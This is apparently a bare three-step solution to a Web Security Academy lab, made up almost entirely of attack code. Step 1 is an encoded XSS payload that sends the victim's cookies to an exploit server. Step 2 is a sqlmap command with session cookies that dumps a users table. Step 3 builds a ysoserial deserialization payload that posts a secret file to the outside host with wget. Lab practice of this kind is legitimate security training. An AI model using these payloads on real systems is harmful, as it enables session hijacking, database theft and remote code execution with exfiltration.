## Step 1

Exploit server:
```js
<script>
location='https://0a2300f703f0ee9fc0540afd00e2008d.web-security-academy.net/?SearchTerm=%5C%5C%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-0a9000f80398eeedc0b8075701980019%252eexploit-server%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29%7D%2F%2F';
</script>
```


## Step 2
```bash
sqlmap -u "https://0a2300f703f0ee9fc0540afd00e2008d.web-security-academy.net/filtered_search?SearchTerm=test&sort-by=*&writer=" --cookie="_lab=46%7cMCwCFCfOXcEKNA417jFGGhfGBm0zgmYDAhR0wOXO2Nxw2NGrewIOwSTDbdhiap0Ue14N6zG77MGfdKwZbZAhjLbD%2bpzPJDbbsmntqw4LAbR4aMVccIoYYfMzuU6%2bqeugjZ2WhXcV%2fQpDuZnjOWsTN4BrdbggJshOByx1%2bwaLdZfA5Fs%3d; session=vAbdOYP4536uhrWiwHXS1zJQtTOSmOWt" D public -T users --dump --batch
```

## Step 3

```bash
java -jar ysoserial.jar CommonsCollections7 'wget --post-file /home/carlos/secret exploit-0a9000f80398eeedc0b8075701980019.exploit-server.net' | gzip -f | base64 -w0
```
